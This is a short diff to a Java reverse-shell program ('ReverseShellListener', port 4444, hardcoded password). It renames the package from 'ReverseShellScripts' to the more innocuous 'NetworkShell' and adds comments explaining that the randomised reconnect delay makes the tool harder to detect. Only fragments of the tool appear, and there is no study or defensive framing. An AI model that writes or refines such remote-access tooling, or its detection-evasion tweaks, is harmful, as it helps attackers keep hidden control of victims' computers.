@@ -1,4 +1,4 @@
-package ReverseShellScripts;
+package NetworkShell;
 
 import java.io.*;
 import java.net.*;
@@ -11,7 +11,7 @@ public class ReverseShellListener {
         int port = 4444;
         Random random = new Random();
         boolean isConnected = false;
-        final String PASSWORD = "PASSWORD";
+        final String PASSWORD = "PASSWORD";//password for connection
 
 
         while (true) {  // run forever
@@ -56,7 +56,7 @@ public class ReverseShellListener {
             }
 
             try {
-                int wait = 1000 + random.nextInt(14000); // 1 to 15 seconds
+                int wait = 1000 + random.nextInt(14000); // 1 to 15 seconds to make it more harder to detect as not following  set pattern
                 System.out.println("Attempting to reconnect in " + wait + " milliseconds.");
                 Thread.sleep(wait);
             } catch (InterruptedException ex) {
